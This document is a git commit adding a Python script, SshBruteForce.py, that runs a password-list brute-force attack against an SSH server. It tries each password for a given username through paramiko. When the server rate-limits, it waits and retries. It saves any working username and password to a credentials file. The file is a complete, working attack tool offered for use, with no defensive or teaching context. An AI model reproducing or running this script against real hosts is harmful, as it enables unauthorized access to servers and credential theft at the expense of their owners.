7302a310d060f1d640d729971460c98c3a50f7c6
Youns92 <56968891+Youns92@users.noreply.github.com>
2021-06-23 13:33:42 +0200

    Add files via upload
    Usage:
    python3 SshBruteForce.py  [-h] [-P PASSLIST] [-u USER] host

---
+++ SshBruteForce.py
@@ -0,0 +1,69 @@
+import paramiko
+import socket
+import time
+from colorama import init, Fore
+
+# initialize colorama
+init()
+
+GREEN = Fore.GREEN
+RED = Fore.RED
+RESET = Fore.RESET
+BLUE = Fore.BLUE
+
+print("""""""""
+    _______.   _______. __    __  .______   .______       __    __  .___________. _______  _______   ______   .______        ______  _______
+    /       | /       ||  |  |  | |   _  \  |   _  \     |  |  |  | |           ||   ____||   ____| /  __  \  |   _  \      /      ||   ____|
+   |   (----`|   (----`|  |__|  | |  |_)  | |  |_)  |    |  |  |  | `---|  |----`|  |__   |  |__   |  |  |  | |  |_)  |    |  ,----'|  |__
+    \   \     \   \    |   __   | |   _  <  |      /     |  |  |  |     |  |     |   __|  |   __|  |  |  |  | |      /     |  |     |   __|
+.----)   |.----)   |   |  |  |  | |  |_)  | |  |\  \----.|  `--'  |     |  |     |  |____ |  |     |  `--'  | |  |\  \----.|  `----.|  |____
+|_______/ |_______/    |__|  |__| |______/  | _| `._____| \______/      |__|     |_______||__|      \______/  | _| `._____| \______||_______|
+
+""""")
+
+
+def is_ssh_open(hostname, username, password):
+    client = paramiko.SSHClient()
+
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(hostname=hostname, username=username, password=password, timeout=3)
+    except socket.timeout:
+
+        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[!] Invalid credentials for {username}:{password}")
+        return False
+    except paramiko.SSHException:
+        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
+
+        time.sleep(60)
+        return is_ssh_open(hostname, username, password)
+    else:
+        # connection was established successfully
+        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        return True
+
+
+if __name__ == "__main__":
+    import argparse
+
+    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
+    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
+    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
+    parser.add_argument("-u", "--user", help="Host username.")
+
+    # parse passed arguments
+    args = parser.parse_args()
+    host = args.host
+    passlist = args.passlist
+    user = args.user
+    # read the file
+    passlist = open(passlist).read().splitlines()
+    # brute-force
+    for password in passlist:
+        if is_ssh_open(host, user, password):
+            # if combo is valid, save it to a file
+            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
+            break
